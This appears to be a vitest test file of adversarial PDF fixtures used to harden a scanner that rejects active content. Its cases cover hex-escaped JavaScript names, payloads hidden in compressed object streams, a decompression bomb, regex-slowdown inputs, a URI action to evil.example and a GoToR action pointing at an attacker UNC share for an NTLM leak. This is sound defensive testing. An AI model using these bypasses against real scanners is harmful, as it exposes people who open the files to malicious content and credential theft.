import { describe, expect, it } from "vitest";
import { constants as zc, createDeflate, deflateSync } from "node:zlib";
import { evidenceVerdict } from "../claim-evidence";

// QA (N1, BR-15, EC-4): adversarial PDFs against the scan heuristic. The heuristic is documented as
// "not a full AV"; these are cheap bypasses of the patterns it does claim to catch, and the files
// end up downloaded by platform admins (PD-024) and the claiming org.
const pdf = (body: string) => {
  const b = new TextEncoder().encode(`%PDF-1.7\n${body}\n%%EOF\n`);
  return [b, b.byteLength] as const;
};

describe("claim evidence verdict: bypasses (QA)", () => {
  it("rejects /JS followed directly by a delimiter (no whitespace)", () => {
    const [b, n] = pdf("1 0 obj << /S /JavaScript >> endobj 2 0 obj << /AA << /O << /JS(app.alert(1)) >> >> >> endobj");
    // Contains /JavaScript, so this one is caught; the next ones are not.
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("rejected");
    const [b2, n2] = pdf("2 0 obj << /Type /Action /S /Foo /JS(app.alert(1)) >> endobj");
    expect(evidenceVerdict(b2, "application/pdf", n2)).toBe("rejected");
  });

  it("rejects name objects written with #hex escapes (/J#61vaScript, /Open#41ction)", () => {
    const [b, n] = pdf("1 0 obj << /Type /Catalog /Open#41ction 2 0 R >> endobj 2 0 obj << /S /J#61vaScript /J#53 (x) >> endobj");
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("rejected");
  });

  it("rejects additional-actions (/AA) and /URI-launching actions", () => {
    const [b, n] = pdf("1 0 obj << /Type /Page /AA << /O << /S /URI /URI (https://evil.example/x) >> >> >> endobj");
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("rejected");
  });

  it("rejects active content placed after the first 2 MB", () => {
    const pad = " ".repeat(2_100_000);
    const [b, n] = pdf(`${pad}\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj`);
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("rejected");
  });

  it("accepts a valid PDF whose header follows a few junk bytes? (spec allows %PDF- within the first 1024 bytes) — documents current strictness", () => {
    const b = new TextEncoder().encode("\n%PDF-1.4\n%%EOF\n");
    // Current behaviour: rejected (strict). Kept as an explicit expectation so a change is noticed.
    expect(evidenceVerdict(b, "application/pdf", b.byteLength)).toBe("rejected");
  });

  // Round 2: ideas against the new whole-name, #xx-decoding scanner.
  it("r2-m1 fixed: rejects /OpenAction hidden in a Flate-compressed object stream (/ObjStm)", () => {
    const inner = "1 0 << /Type /Catalog /OpenAction 2 0 R >> << /S /JavaScript /JS (app.alert(1)) >>";
    const z = deflateSync(Buffer.from(inner, "latin1"));
    const head = `%PDF-1.7\n3 0 obj << /Type /ObjStm /N 2 /First 8 /Filter /FlateDecode /Length ${z.length} >>\nstream\n`;
    const tail = "\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n";
    const b = new Uint8Array(Buffer.concat([Buffer.from(head, "latin1"), z, Buffer.from(tail, "latin1")]));
    expect(evidenceVerdict(b, "application/pdf", b.byteLength)).toBe("rejected");
  });

  it("r2-m1 fixed: rejects /GoToR and /Launch-like remote actions triggered from an annotation (UNC/NTLM leak)", () => {
    const [b, n] = pdf("1 0 obj << /Type /Annot /Subtype /Link /A << /S /GoToR /F (\\\\attacker\\share\\x.pdf) >> >> endobj");
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("rejected");
  });

  it("does not decode #23 twice (/J#2353 is the name 'J#53', not JS) and still catches split-case tricks", () => {
    const [ok, n1] = pdf("1 0 obj << /J#2353 (x) >> endobj");
    expect(evidenceVerdict(ok, "application/pdf", n1)).toBe("clean");
    const [bad, n2] = pdf("1 0 obj << /S/JavaScript/JS<6170702e616c657274283129> >> endobj");
    expect(evidenceVerdict(bad, "application/pdf", n2)).toBe("rejected");
  });

  it("does not flag ordinary names (/JSON-like, /AAPL) as active content", () => {
    const [b, n] = pdf("1 0 obj << /JSONData (x) /AAPL 1 /URI (https://example.com) >> endobj");
    expect(evidenceVerdict(b, "application/pdf", n)).toBe("clean");
  });

  // Round 3: ideas against the Flate-inflating scanner.
  const wrap = (dict: string, body: Buffer, trailer = "trailer << /Root 1 0 R >>") =>
    new Uint8Array(Buffer.concat([Buffer.from(`%PDF-1.7\n3 0 obj << ${dict} /Length ${body.length} >>\nstream\n`, "latin1"), body, Buffer.from(`\nendstream\nendobj\n${trailer}\n%%EOF\n`, "latin1")]));
  const verdict = (b: Uint8Array) => evidenceVerdict(b, "application/pdf", b.byteLength);
  const payload = Buffer.from("<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>", "latin1");

  it("rejects a decompression bomb quickly (200 MB of zeros in ~200 kB)", () => {
    const t = Date.now();
    expect(verdict(wrap("/Filter /FlateDecode", deflateSync(Buffer.alloc(200 * 1024 * 1024))))).toBe("rejected");
    expect(Date.now() - t).toBeLessThan(2_000);
  });

  it("rejects an encrypted PDF whose Flate streams can't be inflated", () => {
    const noise = Buffer.from(Array.from({ length: 256 }, (_, i) => (i * 37 + 11) & 255));
    expect(verdict(wrap("/Type /ObjStm /Filter /FlateDecode", noise, "trailer << /Root 1 0 R /Encrypt 9 0 R >>"))).toBe("rejected");
  });

  it("R3-m1 fixed: rejects an encrypted PDF with an unfiltered object stream (content can't be inspected)", () => {
    const noise = Buffer.from(Array.from({ length: 256 }, (_, i) => (i * 37 + 11) & 255));
    expect(verdict(wrap("/Type /ObjStm /N 1 /First 4", noise, "trailer << /Root 1 0 R /Encrypt 9 0 R >>"))).toBe("rejected");
  });

  it("R3-m1 fixed: inflates a Flate object stream whose dictionary is longer than 4,000 characters", () => {
    expect(verdict(wrap(`/Pad (${"A".repeat(5000)}) /Type /ObjStm /Filter /FlateDecode`, deflateSync(payload)))).toBe("rejected");
  });

  it("R3-m1 fixed: rejects (or decodes) ASCIIHex / ASCII85-encoded object streams", () => {
    expect(verdict(wrap("/Type /ObjStm /Filter /ASCIIHexDecode", Buffer.from(payload.toString("hex") + ">", "latin1")))).toBe("rejected");
  });

  it("R3-1 fixed for repeated '<<': scans a 1 MB adversarial file quickly", () => {
    // 1 MB of "<<" already takes ~9 s; 10 MB took 96 s in QA, blocking the worker's event loop.
    const b = new Uint8Array(Buffer.from("%PDF-1.7\n" + "<<".repeat(512 * 1024), "latin1"));
    const t = Date.now();
    verdict(b);
    expect(Date.now() - t).toBeLessThan(1_000);
  }, 60_000);

  // Round 4 (final): ideas against the linear walker.
  it("BUG (final, major): '/Filter [' runs before a stream keyword are scanned in linear time and within the 2 s budget", () => {
    // filterChain() runs /\/Filter\s*(\[[^\]]*\]|…)/g over the dictionary: every unclosed "[" rescans to the end
    // (quadratic), and the deadline is only checked between streams. 80k runs (720 kB) took 21.9 s, 200k took 138 s.
    const b = new Uint8Array(Buffer.from("%PDF-1.7\n" + "/Filter [".repeat(40_000) + "\nstream\nabc\nendstream\n", "latin1"));
    const t = Date.now();
    verdict(b);
    expect(Date.now() - t).toBeLessThan(2_500);
  }, 120_000);

  it("BUG (final, minor): an indirect /Filter (/Filter 5 0 R) is not left undecoded (fail closed)", () => {
    const body = deflateSync(payload);
    const b = new Uint8Array(Buffer.concat([Buffer.from("%PDF-1.7\n3 0 obj << /Type /ObjStm /Filter 5 0 R >>\nstream\n", "latin1"), body,
      Buffer.from("\nendstream\nendobj\n5 0 obj /FlateDecode endobj\n%%EOF\n", "latin1")]));
    expect(verdict(b)).toBe("rejected");
  });

  it("BUG (final, minor): a 'stream' keyword followed by spaces before the EOL is not skipped (readers accept it)", () => {
    const body = deflateSync(payload);
    const b = new Uint8Array(Buffer.concat([Buffer.from("%PDF-1.7\n3 0 obj << /Type /ObjStm /Filter /FlateDecode >>\nstream  \n", "latin1"), body,
      Buffer.from("\nendstream\nendobj\n%%EOF\n", "latin1")]));
    expect(verdict(b)).toBe("rejected");
  });

  it("BUG (final, minor): a compressed stream whose bytes contain the word 'endstream' isn't truncated before its payload", async () => {
    // Real readers use /Length; the walker stops at the first "endstream" and inflates only the head.
    const d = createDeflate({ level: 0 });
    const chunks: Buffer[] = [];
    d.on("data", (c: Buffer) => chunks.push(c));
    const ended = new Promise((r) => d.on("end", r));
    d.write(Buffer.from("\nendstream\n"));
    await new Promise((r) => d.flush(zc.Z_FULL_FLUSH, () => r(null)));
    await new Promise((r) => d.params(9, zc.Z_DEFAULT_STRATEGY, () => r(null)));
    d.end(Buffer.concat([payload, Buffer.alloc(2000, 32)]));
    await ended;
    const z = Buffer.concat(chunks);
    expect(z.includes("OpenAction")).toBe(false);
    const b = new Uint8Array(Buffer.concat([Buffer.from(`%PDF-1.7\n3 0 obj << /Type /ObjStm /N 1 /First 0 /Filter /FlateDecode /Length ${z.length} >>\nstream\n`, "latin1"), z,
      Buffer.from("\nendstream\nendobj\n%%EOF\n", "latin1")]));
    expect(verdict(b)).toBe("rejected");
  });

  it("benign: Chrome-style compressed PDFs with images and links, and chained ASCII85+Flate content, are accepted", () => {
    const content = deflateSync(Buffer.from("BT /F1 12 Tf 72 712 Td (ATS export: candidate in process) Tj ET", "latin1"));
    const img = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3, 4]);
    const b = new Uint8Array(Buffer.concat([
      Buffer.from(`%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n4 0 obj << /Length ${content.length} /Filter /FlateDecode >>\nstream\n`, "latin1"), content,
      Buffer.from(`\nendstream\nendobj\n5 0 obj << /Type /XObject /Subtype /Image /Filter /DCTDecode /Length ${img.length} >>\nstream\n`, "latin1"), img,
      Buffer.from("\nendstream\nendobj\n6 0 obj << /Type /Annot /Subtype /Link /A << /S /URI /URI (https://example.com/ats) >> >> endobj\n%%EOF\n", "latin1"),
    ]));
    expect(verdict(b)).toBe("clean");
  });
});
